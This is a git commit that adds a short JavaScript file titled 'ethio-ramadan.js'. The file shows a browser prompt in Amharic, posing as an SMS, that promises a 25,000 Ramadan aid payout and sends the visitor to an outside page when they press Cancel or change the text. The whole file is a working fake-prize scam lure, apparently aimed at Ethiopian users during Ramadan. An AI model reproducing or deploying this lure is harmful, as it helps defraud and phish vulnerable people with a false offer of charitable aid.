e9d0cca9f5043797e93832e5848cdc4a224dc888
newblog13 <sweet16guyz@gmail.com>
2026-02-17 11:13:31 +0100

    Create ethio-ramadan.js

---
+++ ethio-ramadan.js
@@ -0,0 +1,5 @@
+var password = 'የእርዳታ ፈንድ ማውጣት'
+password=prompt('SMS: እንኳን ደስ አለህ፣ 25,000 የረመዳን መረዳጃ ፈንድ ለመቀበል ብቁ ነህ ... የአንተን አሁን ለማግኘት እሺን ጠቅ አድርግ','የእርዳታ ፈንድ ማውጣት');
+if (password != 'የእርዳታ ፈንድ ማውጣት') {
+location.href='https://phivez.org/ethio-ramadan.html';
+}
